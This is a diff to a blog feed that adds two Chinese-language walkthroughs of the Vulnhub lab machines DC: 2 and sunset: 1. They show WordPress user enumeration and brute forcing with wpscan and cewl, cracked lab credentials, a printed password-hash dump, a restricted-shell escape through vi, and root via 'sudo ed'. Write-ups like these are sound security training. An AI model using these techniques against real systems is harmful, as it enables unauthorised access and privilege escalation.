@@ -4,6 +4,38 @@
   
     
     <entry>
+      <title>DC: 2</title>
+      <link href="/articles/965feb23.html"/>
+      <url>/articles/965feb23.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC: 2"></a>DC: 2</h2><blockquote><p><a href="https://www.vulnhub.com/entry/dc-2,311/">靶机地址</a></p></blockquote><p>Nmap 扫描结果如下，不过 80 端口应该是需要根据主机名解析，所以编辑 <code>/etc/hosts</code> （Windows 下为 <code>C:\Windows\System32\drivers\etc\hosts</code> ）文件再扫一次</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511200642.png"></p><p>第二次扫描结果如下，是 WordPress，那就直接用 wpscan 扫一下吧</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511201007.png"></p><p>访问网站发现 flag1，给出了提示，需要用户登录和爆破，字典工具 cewl</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514161224.png"></p><p>扫出来仨用户名，准备爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/  --enumerate p --enumerate t --enumerate u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514152824.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;admin\ntom\njerry\n&quot;</span> &gt; user.txt <span class="comment"># 写入用户名</span></span><br><span class="line">cewl http://dc-2/ &gt; passwd.txt <span class="comment"># 生成字典</span></span><br><span class="line">wpscan --url http://dc-2/ -U user.txt -P passwd.txt</span><br></pre></td></tr></table></figure><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250514153947.png)</p><blockquote><p><code>jerry/adipiscing</code><br><code>tom/parturient</code></p></blockquote><p>Dirsearch 扫出来了一些目录，用爆破出来的用户名密码登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514161546.png"></p><p>登录以后，拿到 <a href="http://dc-2/wp-admin/post.php?post=21&action=edit">flag2</a> ，提示从另一个切入点进行攻击，应该是从那个非常规的 ssh 端口进行攻击</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514180813.png"></p><p>Jerry 的账号密码无法登陆，tom 的成功登录进去了，但是是一个受限的 shell，不过看到目录下有一个 vi 命令，那么就能够通过 vi 绕过受限 shell</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514184716.png"></p><p>绕过受限 shell 以后，导出环境变量以后就能正常执行命令了并且拿到了 flag3，这个同样应该也是一个提示，然后发现 tom 没有 sudo 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功绕过以后，导出环境变量</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash:<span class="variable">$SHELL</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514190359.png"></p><p>查看 <code>/etc/passwd</code> 发现有一个 jerry 用户，且 shell 环境是 <code>/bin/bash</code>，尝试 <code>su jerry</code> ，成功通过之前爆破出来的密码登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514190805.png"></p><p>然后通过 git 提权，拿到最后的 flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514185345.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sunset: 1</title>
+      <link href="/articles/c581b7b5.html"/>
+      <url>/articles/c581b7b5.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="sunset-1"><a href="#sunset-1" class="headerlink" title="sunset: 1"></a>sunset: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/sunset-1,339/">靶机地址</a></p></blockquote><p>Nmap 扫出来一个可以匿名登录的 ftp 端口</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514232913.png"></p><p>然后发现一个 <code>backup</code> 文件，里边存储了用户名和哈希值，下载下来使用 john 爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREDENTIALS:                                     </span><br><span class="line">office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.</span><br><span class="line">datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/</span><br><span class="line">sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0</span><br><span class="line">sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/</span><br><span class="line">space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/</span><br></pre></td></tr></table></figure><p>爆破出来三个密码：<code>space/space</code>、<code>sunset/cheer14</code>、<code>sky/sky</code>，然后尝试 ssh 登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515004131.png"></p><p><code>space</code> 和 <code>sky</code> 无法登录，但是 <code>sunset</code> 可以，登录之后发现当前目录下有一个 <code>user.txt</code>，里边存放的是 <code>sunset</code> 的 md5 值</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515005450.png"></p><p>然后发现可以直接提权，提权之后在 <code>/root</code> 目录下拿到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> ed</span><br><span class="line">!/bin/bash</span><br><span class="line"><span class="built_in">ls</span> ~</span><br><span class="line"><span class="built_in">cat</span> ~/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515005616.png"></p><blockquote><p><code>25d7ce0ee3cbf71efbac61f85d0c14fe</code></p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Sputnik: 1</title>
       <link href="/articles/1ac0b2ee.html"/>
       <url>/articles/1ac0b2ee.html</url>
